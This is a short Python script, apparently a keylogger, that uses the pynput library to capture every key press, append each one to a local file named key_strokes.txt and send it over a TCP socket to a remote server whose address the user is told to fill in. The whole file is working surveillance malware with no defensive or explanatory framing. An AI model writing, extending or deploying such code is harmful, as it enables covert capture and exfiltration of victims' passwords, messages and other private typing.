from pynput import keyboard
import socket

SERVER_IP = '127.0.0.1'  # Replace with the IP address of your server
SERVER_PORT = 12345

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_IP, SERVER_PORT))

log_file = 'key_strokes.txt'

def on_key_press(key):
    try:
        with open(log_file, 'a') as file:
            key_str = str(key).replace("'", '')
            file.write(f"{key_str} "+ "\n")
            client.send(key_str.encode('utf-8'))
    except Exception as e:
        print(f"Error writing to log file: {e}")

def on_key_release(key):
    pass

with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()
